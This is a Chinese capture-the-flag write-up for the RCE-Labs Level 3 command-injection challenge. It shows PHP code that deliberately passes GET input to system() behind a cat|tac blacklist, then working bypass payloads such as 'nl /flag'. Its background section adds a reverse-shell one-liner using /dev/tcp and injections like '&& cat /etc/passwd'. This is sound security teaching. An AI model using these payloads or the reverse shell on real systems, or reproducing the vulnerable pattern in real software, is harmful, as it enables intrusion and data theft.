RCE-Labs Level 3 - 黑名单再升级与多命令试探

2026年10月3日 RCE-Labs 黑名单绕过 GET传参

一、题目信息

  • 题目名称：RCE-Labs Level 3 (head 命令查看文件头)
  • 题目平台：RCE-Labs 靶场 (灵境平台部署)
  • 题目类型：Web安全 / 远程代码执行 (RCE) / 黑名单绕过进阶
  • 靶场链接：http://靶机IP:8080/less-3/
  • 涉及工具：浏览器

二、解题步骤

1. 分析题目考什么

本题核心考察的是面对逐步升级的黑名单过滤，如何灵活替换系统命令。Level 2 只拦截了 cat，Level 3 升级为拦截 cat 或 tac。同时，本题也考查了对 HTTP GET 请求传参的基本理解。

2. 怎么想（破题思路）

  • 阅读源码，发现正则表达式变为了 #/cat|tac/#，这意味着 cat 和 tac 都被拉黑了。
  • 既然读取文件的命令很多，只要绕过 WAF 的规则，就能继续使用其它命令。
  • 题目弹窗提示使用 head。在 Linux 中，head、nl、more、less、tail、sort 等命令都可以读取文件内容。
  • 这是一个 Web 靶场，输入这些命令的最直接方式就是通过 URL 发送 GET 请求。

3. 怎么解（详细步骤与逐字翻译）

源码逐字翻译与符号解析

<?php
# ./flag
highlight_file(__FILE__);
$cmd = $_GET['cmd'] ?? 'echo "<br>Ciallo~(∠・ω< )★"';
$pattern = '/cat|tac/';
if(!preg_match($pattern,$cmd)){
    system($cmd);
}
  • $pattern = '/cat|tac/';：正则表达式的核心变化。| 是正则表达式中的“或者”运算符。它表示只要匹配到了 cat 字符串或者匹配到了 tac 字符串，就算命中黑名单。
  • 其余代码逻辑与 Level 2 相同。条件 if(!preg_match(...)) 的含义是：如果 $cmd 中不包含这两个命令，就执行 system($cmd)。

踩坑与测试记录

测试 1：尝试 ?cmd=cat /flag 和 ?cmd=tac /flag，页面无回显，被 WAF 拦截。

测试 2（首选替代）：尝试 ?cmd=head /flag，成功执行，但发现默认只输出文件的前 10 行，如果 flag 在第一行正好能看全。

测试 3（加行号）：尝试 ?cmd=nl /flag，不仅成功读取，还给文件内容加上了行号，回显为 1 flag{TEST_Dynamic_FLAG}。

测试 4（分页查看）：尝试 ?cmd=more /flag，同样成功回显 flag{TEST_Dynamic_FLAG}。

最终成功 Payload 与 HTTP 协议解析

成功 URL 示例：

http://靶机IP:8080/less-3/?cmd=nl /flag
http://靶机IP:8080/less-3/?cmd=more /flag

协议解析：当浏览器向此 URL 发起请求时，发送的是标准的 HTTP GET 请求。请求行类似于 GET /less-3/?cmd=nl%20/flag HTTP/1.1。服务器端 PHP 解析出 $_GET['cmd'] 的值 nl /flag，再传递给 system() 执行。所以，只要是 GET 传参，修改 URL 就能直接注入命令。

4. 怎么迁移（跨学科与跨领域联想）

  • 安全对抗领域：WAF 规则编写者与攻击者进行“军备竞赛”。开发者今天拦截 cat，明天拦截 tac，但系统内置的命令库庞大无比，开发者永远无法穷举所有变体，这就是黑名单的天然劣势。
  • 日常生活领域：就像小区保安接到通知“拦住拿菜刀和拿砍刀的人”，结果你提着把长柄大勺进去了，同样是铁器，同样能造成伤害。只防名字不防行为，是极其被动的。

三、名词大全与原理深度复盘

1. HTTP GET 请求

HTTP 协议中最常见的请求方法之一。用于向服务器请求获取资源。它的特征是将参数直接附加在 URL 后面（即 ?key=value&key2=value2）。在本关，参数 cmd 通过 GET 传递，因此直接在浏览器地址栏输入即可生效。

2. 正则表达式的“或”逻辑 |

在正则中，| 表示“选择”，即匹配前或后的任意一项。如 /cat|tac/ 等同于“匹配 cat 或 tac”。防御者常用这种方式扩大拦截范围，但对于熟练掌握各种命令的人来说，只要稍微变换一下就能绕过。

3. Linux 命令的等效性

在 Linux 系统中，几乎所有功能都有多个实现命令。例如“读取文件”这一个动作，有正向读取（cat）、反向读取（tac）、只读头部（head）、只读尾部（tail）、加行号读取（nl）等。这种丰富的生态使得单一黑名单的拦截效果极其脆弱。

四、题目思考

1. 这跟前面关卡的区别

  • 与 Level 1 的区别：Level 1 完全没有防护，随你怎么打。
  • 与 Level 2 的区别：Level 2 只拦截了一个关键字 cat，此时你可以用 tac 过。但 Level 3 用 | 将 tac 也加入了黑名单，迫使你跳出“只想到 cat 和 tac”的思维定式，去认识更多 Linux 命令。

2. 这种题目出现的原因（底层逻辑与历史原因）

Web 开发早期，程序员常在网页上提供“网络诊断”（如 ping 一个 IP）、“查看日志”等功能。为了实现这些功能，后台代码会调用 system("ping " . $ip) 或 system("cat " . $log_path)。当参数被外部用户控制时，恶意用户只需在参数后面拼接 | whoami 或 && cat /etc/passwd，就能劫持整个命令执行过程，从而读取任意文件或执行任意操作。这就是系统命令注入漏洞的历史根源。

3. 这种漏洞在实际中的应用

在渗透测试中，拿下 RCE 后，我们通常会通过反弹 Shell（如 bash -i >& /dev/tcp/... 0>&1）获取更稳定的交互式终端。为了绕过 WAF，红队成员必须熟练掌握数十种命令的替代使用方式。

4. 如何抽象理解概念（大白话）

把服务器比作一个只会机械执行命令的“机器人”。它接受你输入的纸条，然后立刻照做。WAF 是机器人的“纠察员”，他手里拿着一张“禁止名单”，上面写着：禁止使用写着“看”字样的工具去看书。但你完全可以用写着“瞄”、“瞥”、“读”的工具去执行同样的动作。靶场就是让你找出那些没有被列入禁止名单，但功能一样的工具。
